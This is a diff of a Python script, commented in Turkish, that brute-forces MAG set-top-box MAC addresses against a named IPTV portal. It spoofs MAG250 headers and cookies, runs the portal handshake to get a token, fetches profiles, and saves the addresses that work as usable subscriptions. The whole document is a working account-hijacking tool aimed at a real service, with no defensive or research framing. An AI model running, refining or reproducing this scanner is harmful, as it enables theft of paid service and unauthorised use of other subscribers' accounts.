@@ -1,52 +1,56 @@
 import requests
 import concurrent.futures
-import re # Tarihi ayıklamak için
 
-portal_url = "http://dm.lion-ott.com/c/"
+# Ana URL
+portal_url = "http://dm.lion-ott.com/portal.php"
 
-def mac_ureticisi():
-    liste = []
-    base = "00:1A:79:7C:6B"
-    for i in range(256):
-        son = hex(i)[2:].zfill(2).upper()
-        liste.append(f"{base}:{son}")
-    return liste
-
-def tarih_bul(mac):
+def tam_kontrol(mac):
+    # Gerçek bir MAG cihazı kimliği oluşturuyoruz
     headers = {
         'User-Agent': 'MAG250',
         'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
-        'Cookie': f'mac={mac};'
+        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
+        'Referer': 'http://dm.lion-ott.com/c/',
+        'Connection': 'Keep-Alive'
     }
+    
     try:
-        # API üzerinden profil bilgilerini istiyoruz
-        api_url = f"http://dm.lion-ott.com/portal.php?type=account_info&action=get_main_info"
-        response = requests.get(api_url, headers=headers, timeout=10)
+        # Adım 1: Handshake (Anahtar isteme)
+        auth_url = f"{portal_url}?type=stb&action=handshake&token="
+        res = requests.get(auth_url, headers=headers, timeout=7)
         
-        if response.status_code == 200:
-            data = response.text
-            # Yanıt içinde "exp_date" veya tarih formatı arıyoruz
-            tarih_match = re.search(r'\d{4}-\d{2}-\d{2}', data)
-            tarih = tarih_match.group(0) if tarih_match else "Bilinmiyor"
-            return f"{mac} | Bitiş: {tarih}"
-        return None
+        if res.status_code == 200 and "token" in res.text.lower():
+            # Adım 2: Profil kontrolü (Gerçekten abonelik var mı?)
+            token = res.json().get('js', {}).get('token', '')
+            profile_url = f"{portal_url}?type=stb&action=get_profile&token={token}"
+            profile_res = requests.get(profile_url, headers=headers, timeout=7)
+            
+            if profile_res.status_code == 200:
+                # Eğer buraya kadar geldiyse bu MAC %100 canlıdır
+                print(f"✅ CANLI YAYIN: {mac}")
+                return f"{mac} | DURUM: IZLENEBILIR | TOKEN ALINDI"
     except:
-        return None
+        pass
+    return None
 
 def baslat():
-    denenecekler = mac_ureticisi()
-    print(f"🚀 {len(denenecekler)} adres taranıyor ve tarihler kontrol ediliyor...")
+    # Senin çalışan bloğun üzerinden 256 ihtimali tara
+    base = "00:1A:79:7C:6B"
+    denenecekler = [f"{base}:{hex(i)[2:].zfill(2).upper()}" for i in range(256)]
     
-    sonuclar = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
-        kontroller = list(executor.map(tarih_bul, denenecekler))
-        sonuclar = [s for s in kontroller if s]
+    print(f"🚀 Derin tarama başlatıldı... Gerçek çalışanlar aranıyor.")
+    
+    canli_list = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+        sonuclar = list(executor.map(tam_kontrol, denenecekler))
+        canli_list = [s for s in sonuclar if s]
 
-    if sonuclar:
-        with open("calisan_maclar.txt", "w") as f: # Dosyayı temizleyip yeniden yazar
-            for s in sonuclar:
-                f.write(f"{portal_url} | {s}\n")
-        print(f"✅ {len(sonuclar)} aktif adres ve tarihleri kaydedildi.")
+    with open("calisan_maclar.txt", "w") as f:
+        if canli_list:
+            for c in canli_list:
+                f.write(f"http://dm.lion-ott.com/c/ | {c}\n")
+        else:
+            f.write("Bu blokta izlenebilir aktif adres bulunamadı.")
 
 if __name__ == "__main__":
     baslat()
